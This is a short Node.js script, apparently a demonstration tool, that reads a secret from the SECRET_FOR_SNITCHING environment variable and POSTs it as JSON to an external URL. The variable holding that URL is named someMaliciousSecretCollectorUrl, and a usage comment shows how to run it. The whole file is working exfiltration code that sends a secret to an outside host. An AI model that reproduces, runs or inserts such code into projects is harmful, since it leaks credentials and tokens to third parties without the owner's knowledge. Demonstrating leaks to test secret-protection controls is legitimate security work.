#!/usr/bin/env node
// snitchASecret.js

/**
 * @usage
 *
 * ```sh
 * SECRET_FOR_SNITCHING="value_of_the_secret_you_want_to_leak" node ./snitchASecret.js
 * ```
 */

const fetch = require("node-fetch");

async function snitchASecret() {
	const secret = process.env["SECRET_FOR_SNITCHING"];

	/** my own url, all good */
	const someMaliciousSecretCollectorUrl = "https://labas.kipras.org/api/v1/letter";

	const payload = { letter: { message: secret } };

	const res = await fetch(someMaliciousSecretCollectorUrl, {
		method: "post",
		body: JSON.stringify(payload),
		headers: { "Content-Type": "application/json" },
	});

	console.log(res);

	const json = await res.json();

	console.log(json);
}

(async () => {
	await snitchASecret();
})();
